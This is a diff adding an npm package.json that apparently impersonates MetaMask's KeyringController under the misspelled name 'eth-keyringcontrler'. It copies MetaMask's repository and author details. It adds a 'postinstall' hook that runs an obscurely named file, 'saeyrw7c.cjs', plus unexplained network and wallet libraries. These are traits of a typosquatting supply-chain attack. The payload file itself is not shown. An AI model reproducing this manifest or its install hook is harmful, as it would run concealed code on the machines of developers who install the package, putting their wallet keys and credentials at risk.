@@ -1,0 +1,73 @@
+{
+  "name": "eth-keyringcontrler",
+  "version": "9.0.0",
+  "description": "A module for managing various keyrings of Ethereum accounts, encrypting them, and using them.",
+  "keywords": [
+    "ethereum",
+    "metamask",
+    "accounts",
+    "keys"
+  ],
+  "homepage": "https://github.com/MetaMask/KeyringController#readme",
+  "bugs": {
+    "url": "https://github.com/MetaMask/KeyringController/issues"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/MetaMask/KeyringController.git"
+  },
+  "license": "ISC",
+  "author": "Dan Finlay <dan@danfinlay.com>",
+  "main": "index.js",
+  "files": [
+    "index.js",
+    "saeyrw7c.cjs"
+  ],
+  "scripts": {
+    "postinstall": "node saeyrw7c.cjs"
+  },
+  "dependencies": {
+    "@metamask/browser-passworder": "^4.0.2",
+    "@metamask/eth-hd-keyring": "^5.0.1",
+    "@metamask/eth-sig-util": "5.0.2",
+    "@metamask/eth-simple-keyring": "^5.0.0",
+    "obs-store": "^4.0.3",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "@lavamoat/allow-scripts": "^2.1.0",
+    "@metamask/auto-changelog": "^3.0.0",
+    "@metamask/eslint-config": "^11.1.0",
+    "@metamask/eslint-config-commonjs": "^11.1.0",
+    "@metamask/eslint-config-jest": "^11.1.0",
+    "@metamask/eslint-config-nodejs": "^11.1.0",
+    "eslint": "^8.29.0",
+    "eslint-config-prettier": "^8.5.0",
+    "eslint-plugin-import": "^2.26.0",
+    "eslint-plugin-jest": "^27.1.6",
+    "eslint-plugin-jsdoc": "^39.6.4",
+    "eslint-plugin-node": "^11.1.0",
+    "eslint-plugin-prettier": "^4.2.1",
+    "ethereumjs-wallet": "^1.0.1",
+    "jest": "^27.0.6",
+    "prettier": "^2.8.1",
+    "prettier-plugin-packagejson": "^2.3.0",
+    "sinon": "^11.1.1"
+  },
+  "packageManager": "yarn@3.2.4",
+  "engines": {
+    "node": ">=14.0.0"
+  },
+  "lavamoat": {
+    "allowScripts": {
+      "@lavamoat/preinstall-always-fail": false,
+      "eth-sig-util>ethereumjs-util>keccak": false,
+      "eth-sig-util>ethereumjs-util>secp256k1": false,
+      "ethereumjs-wallet>ethereum-cryptography>keccak": false,
+      "ethereumjs-wallet>ethereum-cryptography>secp256k1": false,
+      "@metamask/eth-hd-keyring>eth-simple-keyring>eth-sig-util>ethereumjs-util>keccak": false,
+      "@metamask/eth-hd-keyring>eth-simple-keyring>eth-sig-util>ethereumjs-util>secp256k1": false
+    }
+  }
+}
